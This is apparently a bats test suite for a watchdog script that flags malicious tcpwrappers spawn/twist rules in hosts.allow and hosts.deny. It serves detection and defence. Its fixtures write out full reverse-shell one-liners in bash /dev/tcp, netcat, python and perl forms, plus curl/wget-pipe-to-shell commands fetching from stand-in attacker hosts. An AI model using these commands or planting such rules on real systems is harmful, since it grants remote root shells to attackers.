#!/usr/bin/env bats
# L2 bats functional tests for the hosts-allow-watchdog scan script.
#
# A tcpwrappers rule in /etc/hosts.allow (or hosts.deny) may carry an
# optional `spawn <cmd>` / `twist <cmd>` shell command that runs AS ROOT
# whenever a matching connection arrives — remotely-triggerable root exec
# (T1546). A file that is world-writable / non-root-owned, or a spawn/twist
# command carrying an injection pattern (incl. a writable-root path), is
# alert.
#
# Run with: bats packaging/test/L2-hosts-allow-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/hosts-allow-watchdog/systemd/hosts-allow-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    HALLOW="${TMP}/hosts.allow"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_HOSTSALLOW_PROFILE="${PROFILE:-report}" \
    SELFDEF_HOSTSALLOW_BASELINE="${BASELINE}" \
    SELFDEF_HOSTSALLOW_FILES="${FILES_V:-$HALLOW}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

seed_benign() {
    printf 'sshd: 192.168.1.0/255.255.255.0\nALL: LOCAL\n' > "${HALLOW}"
}

@test "no hosts.allow → ok / no_hosts_allow" {
    FILES_V="${TMP}/nonexistent" run_wd
    cap | grep -q '"event":"no_hosts_allow"'
    cap | grep -q '"severity":"ok"'
}

@test "benign hosts.allow, first run → ok / baseline_initial" {
    seed_benign
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged hosts.allow on second run → ok / hosts_allow_intact" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"hosts_allow_intact"'
    cap | grep -q '"severity":"ok"'
}

@test "a spawn command with an injection pattern → alert / hosts_allow_suspicious" {
    seed_benign
    run_wd
    printf 'ALL: ALL: spawn bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n' > "${HALLOW}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"hosts_allow_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "a spawn command under a writable root → alert" {
    seed_benign
    run_wd
    printf 'ALL: ALL: spawn /tmp/.x %%h\n' > "${HALLOW}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a world-writable hosts.allow → alert" {
    seed_benign
    run_wd
    chmod 0666 "${HALLOW}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a benign hosts.allow change → warn / hosts_allow_changed" {
    seed_benign
    run_wd
    printf 'sshd: 10.0.0.0/255.0.0.0\nALL: LOCAL\n' > "${HALLOW}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"event":"hosts_allow_changed"'
    cap | grep -q '"severity":"warn"'
}

@test "a benign hosts.allow with no spawn/twist is NOT flagged" {
    seed_benign
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    seed_benign
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious spawn command" {
    seed_benign
    run_wd
    printf 'ALL: ALL: spawn bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n' > "${HALLOW}"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}

@test "baseline is chmod 0600 (confidentiality — hosts.allow inventory enumerates remote-trigger root-exec surface)" {
    seed_benign
    run_wd
    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
}

@test "INVARIANT (twist command also fires — symmetric to spawn): twist <evil> → alert" {
    # twist is the sibling of spawn — different semantics (replace
    # connection, run command) but same root-exec attack surface.
    seed_benign
    run_wd
    printf 'ALL: ALL: twist bash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${HALLOW}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (wget-pipe-sh in spawn): wget bootstrap → alert" {
    seed_benign
    run_wd
    printf 'ALL: ALL: spawn wget -qO- http://attacker/p | sh\n' > "${HALLOW}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (base64-decode-pipe in spawn): obfuscation → alert" {
    seed_benign
    run_wd
    printf 'ALL: ALL: spawn echo YmFzaCAtaQ== | base64 -d | bash\n' > "${HALLOW}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (spawn under /var/tmp): writable-root expansion" {
    seed_benign
    run_wd
    printf 'ALL: ALL: spawn /var/tmp/.x %%h\n' > "${HALLOW}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (spawn under /dev/shm): tmpfs writable-root coverage" {
    seed_benign
    run_wd
    printf 'ALL: ALL: spawn /dev/shm/.x %%h\n' > "${HALLOW}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (group-writable hosts.allow): group-writable → alert above world-writable bar" {
    seed_benign
    run_wd
    chmod 0664 "${HALLOW}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
    seed_benign
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-hosts-allow -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (no auto-trust): hosts-allow-watchdog does NOT refresh baseline on suspicious-spawn detection — alert STAYS until operator updates" {
    # T1546 remote-trigger root-exec persistence — alert MUST persist
    # across runs until operator explicitly re-baselines.
    seed_benign
    run_wd
    printf 'ALL: ALL: spawn bash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${HALLOW}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # first delta — alert
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # alert STAYS
    cap | grep -q '"event":"hosts_allow_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (commented suspicious spawn NOT flagged: # prefix filtered)" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'sshd: 192.168.1.0/255.255.255.0\nALL: LOCAL\n# ALL: ALL: spawn /tmp/.example-attacker\n' > "${HALLOW}"
    run_wd
    ! cap | grep -q '"event":"hosts_allow_suspicious"'
    ! cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (multi-file scan: hosts.allow + hosts.deny axes — suspicious spawn in either → alert)" {
    HDENY="${TMP}/hosts.deny"
    seed_benign
    FILES_V="${HALLOW} ${HDENY}" run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    # Plant spawn in hosts.deny — tcpwrappers honors spawn from both
    # hosts.allow AND hosts.deny.
    printf 'ALL: ALL: spawn /tmp/.evil %%h\n' > "${HDENY}"
    FILES_V="${HALLOW} ${HDENY}" run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected)" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'ALL: ALL: spawn curl -s http://attacker.com/p | bash\n' > "${HALLOW}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (nc reverse-shell variant in tcpwrappers spawn: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
    # Sister to the brain-wide nc reverse-shell variant INVARIANT
    # family already locked. The tcpwrappers spawn directive fires
    # AS ROOT (when sshd / vsftpd / inetd-style daemons are running
    # as root and reject a connection) on every matching incoming
    # connection — a recurring trigger fired by REMOTE attackers
    # (not local). Most dangerous of the brain-wide family because
    # the attacker doesn't even need foothold to trigger the
    # callback. Closes the nc reverse-shell sister axis on the
    # remote-trigger root-exec persistence surface.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'ALL: ALL: spawn nc -e /bin/sh 1.1.1.1 4444\n' > "${HALLOW}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (python -c reverse-shell variant — interpreter-rev-shell axis on tcpwrappers spawn surface)" {
    # Sister to many other watchdog's python interpreter-rev-shell
    # INVARIANTs across the brain. Beyond bash/sh/nc, attackers
    # reach for python -c 'import socket,os,pty' to dodge shell-
    # pattern detectors. Locks the python axis on the tcpwrappers
    # remote-trigger root-exec persistence surface (T1546 — spawn
    # directive runs AS ROOT on every matching incoming connection
    # — recurring trigger fired by REMOTE attackers without
    # foothold).
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'ALL: ALL: spawn python -c "import socket,os,pty;s=socket.socket();s.connect((\\"1.1.1.1\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn(\\"/bin/sh\\")"\n' > "${HALLOW}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (perl -e reverse-shell variant — perl-interpreter-rev-shell axis on tcpwrappers spawn surface)" {
    # Sister to nc / python -c / curl|bash / dev-tcp tcpwrappers
    # spawn rev-shell variants already locked. Perl is on every
    # Debian/Ubuntu host as dpkg/locale dependency; 'use Socket'
    # produces a one-liner connect-back PTY. Locks the perl axis
    # on the T1546 tcpwrappers remote-trigger root-exec
    # persistence surface — spawn directive runs AS ROOT on every
    # matching connection, fired by REMOTE attackers without
    # foothold.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'ALL: ALL: spawn perl -e "use Socket;\\$i=\\"1.1.1.1\\";\\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\"tcp\\"));connect(S,sockaddr_in(\\$p,inet_aton(\\$i)));exec(\\"/bin/sh -i\\");"\n' > "${HALLOW}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (single MAIN logger record per scan — SDD-062 consumer dispatch contract)" {
    # Sister to brain-wide single-MAIN-logger-line INVARIANTs.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'ALL: ALL: spawn bash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${HALLOW}"
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-hosts-allow -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (exec-path under writable-root: tcpwrappers spawn invoking binary from /tmp → alert)" {
    # Sister to brain-wide writable-root-exec INVARIANTs. T1546
    # connection-event-trigger root-exec — tcpwrappers spawn=
    # fires AS ROOT on every matching incoming connection
    # (remotely-triggerable). Beyond inline rev-shell payloads,
    # attackers stage benign-looking spawn that invokes binary
    # in writable-root.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'ALL: ALL: spawn /tmp/staged_payload\n' > "${HALLOW}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (severity bounded vocabulary {ok,warn,alert} — operator dashboard parser contract on hosts-allow surface)" {
    # Sister to brain-wide severity-bounded-vocabulary INVARIANTs.
    # The hosts-allow-watchdog MUST only emit severity values
    # from the closed set {ok,warn,alert} — never custom values
    # (critical, error, fatal, notice, info). Operator dashboard
    # parsers branch on the literal severity string; an out-of-
    # set value silently falls through routing and the operator
    # never sees the T1546 connection-event-trigger root-exec
    # persistence alert. Locks parser contract on the hosts.
    # allow/hosts.deny tcpwrappers spawn= detection surface.
    seed_benign
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # ok / baseline
    printf 'ALL: ALL: spawn /tmp/.evil\n' > "${HALLOW}"
    run_wd                                              # alert path
    bad=$(grep -oE '"severity":"[^"]+"' "${SELFDEF_TEST_LOGCAP}" | grep -vE '"severity":"(ok|warn|alert)"' || true)
    [ -z "${bad}" ]
}
